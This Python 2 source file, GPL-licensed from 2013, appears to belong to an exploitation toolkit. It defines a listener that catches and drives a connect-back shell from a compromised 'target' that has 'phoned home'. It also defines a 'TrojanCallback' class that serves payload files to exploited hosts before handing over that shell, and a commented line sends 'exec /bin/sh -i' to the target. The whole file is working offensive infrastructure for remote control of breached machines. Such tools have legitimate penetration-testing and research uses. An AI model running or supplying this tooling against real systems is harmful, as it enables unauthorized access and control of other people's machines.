#Copyright (C) 2013  Zachary Cutlip [uid000_at_gmail_dot_com]
#
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.



import signal
import socket
import sys
import os
import select
import traceback

class Callback(object):
    MAX_READ=1024
    def __init__(self,callback_ip,port=8080,startcmd=None,connectback_shell=True):
        self.callback_ip=callback_ip
        self.port=port
        self.startcmd=startcmd
        self.connectback_shell=connectback_shell

    def handler(self,signum,frame):
        print >>sys.stderr,"signal num %d\n"%signum
        self.keepgoing=False

    def server(self,port):
        serversocket = socket.socket(
                socket.AF_INET,socket.SOCK_STREAM)
        serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        serversocket.bind(("0.0.0.0",int(port)))
        serversocket.listen(5)
        return serversocket


    def serve_callback_shell(self):

        max_read=self.__class__.MAX_READ
        signal.signal(signal.SIGINT,self.handler)
        signal.signal(signal.SIGTERM,self.handler)
        server_socket=self.server(self.port)
        print >>sys.stderr,"Listening on port %d\n" % int(self.port)
        print >>sys.stderr,"Waiting for incoming connection.\n"
        self.keepgoing=True
        
        try:
            (clientsocket,addess) = server_socket.accept()
        except Exception as e:
            server_socket.shutdown(socket.SHUT_RDWR)
            server_socket.close()
            return

        print "Target has phoned home.\n"
        fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
        inputlist=[clientsocket,sys.stdin]
        
        
        if None != self.startcmd:
            clientsocket.send(self.startcmd+"\n")
        #clientsocket.send("exec /bin/sh -i\n")
        
        while self.keepgoing==True:
            try:
                inp,outp,excep=select.select(inputlist,[],[])
                for f in inp:
                    if f is clientsocket:
                        data=f.recv(max_read)
                        if data:
                            sys.stdout.write(data)
                            sys.stdout.flush()
                    else:
                        data=sys.stdin.readline()
                        if data:
                            clientsocket.send(data)

            except Exception as e:
                #print traceback.format_exc()
                print >>sys.stderr,str(e)
                self.keepgoing=False
                print >>sys.stderr,""
                print >>sys.stderr,"Closing connection.\n"
                clientsocket.shutdown(socket.SHUT_RDWR)
                clientsocket.close()
                server_socket.shutdown(socket.SHUT_RDWR)
                server_socket.close()

        print >>sys.stderr,"Exiting\n"
        sys.exit()
        

    def serve_callback(self):
        pid=None
        if self.connectback_shell:
            pid=os.fork()
            if pid and pid > 0:
                return pid
            else:
                self.serve_callback_shell()
   

class TrojanCallback(Callback):
    def __init__(self,callback_ip,files_to_serve,port=8080,connectback_shell=False):
        super(self.__class__,self).__init__(callback_ip,port=8080)
        self.files_to_serve=files_to_serve
        self.connectback_shell=connectback_shell
    
   
    def serve_file_to_client(self,filename,serversocket):
        data=open(filename,"r").read();
        (clientsocket,address) = serversocket.accept()
        clientsocket.send(data)
        
        clientsocket.shutdown(socket.SHUT_RDWR)
        clientsocket.close()
    def exit(self):
        os.execv("/bin/true",["/bin/true"])

    def serve_callback(self):
        pid=os.fork()
        if 0!=pid:
            return pid

        serversocket=self.server(self.port)
        for _file in self.files_to_serve:
            print "Waiting to send file: %s\n" % _file
            self.serve_file_to_client(_file,serversocket)
            print "\nDone with file: %s\n"%_file
        
        serversocket.shutdown(socket.SHUT_RDWR)
        serversocket.close()
        
        if self.connectback_shell == True:
            print "Serving callback_shell."
            self.serve_callback_shell()
        self.exit()
            


